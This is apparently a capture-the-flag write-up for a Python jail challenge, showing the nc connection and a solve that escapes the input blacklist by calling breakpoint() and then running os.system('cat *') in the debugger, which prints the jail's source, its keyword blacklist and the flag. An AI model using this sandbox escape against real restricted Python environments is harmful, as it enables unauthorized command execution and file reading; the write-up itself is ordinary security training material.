# jail/Baby's First Pyjail
`Points: 100`

### Description
```
@windex told me that jails should be sourceless. So no source for you.

Author: SteakEnthusiast

nc 35.226.249.45 5000
```

```shell
~ % nc 35.226.249.45 5000
breakpoint()
--Return--
<string>(1)<module>()->None
(Pdb) __import__('os').system('cat *')
blacklist = ["import", "exec", "eval", "os","open","read","system","module","write", "."]

while True:
    print(">>>", end=" ")
    try:
        cmd = input()
        for i in blacklist:
            if i in cmd:
                raise Exception("try harder")
        exec(cmd)
    except Exception as e:
        print(e)
uoftctf{you_got_out_of_jail_free}
```

ez win hahaaaaaa